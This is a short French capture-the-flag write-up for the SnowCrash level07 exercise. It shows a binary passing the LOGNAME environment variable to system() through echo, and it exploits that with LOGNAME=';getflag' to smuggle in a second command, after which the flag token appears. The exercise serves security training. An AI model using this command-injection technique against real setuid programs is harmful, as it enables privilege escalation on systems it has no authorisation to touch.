@@ -1,0 +1,25 @@
+dans le home il y a un fichier c compile
+
+si on lance la commande: xxd level07 | less
+
+on peut voir:
+
+0000680: 4c4f 474e 414d 4500 2f62 696e 2f65 6368  LOGNAME./bin/ech
+0000690: 6f20 2573 2000 0000 011b 033b 3000 0000  o %s ......;0...
+
+donc l'executable affiche la variable d'environnemnt LOGNAME avec la commande echo
+
+
+Vu qu'il utilise le chemin complet d'echo on ne pourra pas exploiter le path.
+
+
+avec nm on peut voir que le code lance la fonction system
+
+
+explication de la faille:
+https://wiki.sei.cmu.edu/confluence/pages/viewpage.action?pageId=87152177
+
+exploit:
+level07@SnowCrash:~$ LOGNAME=";getflag" ./level07
+
+Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
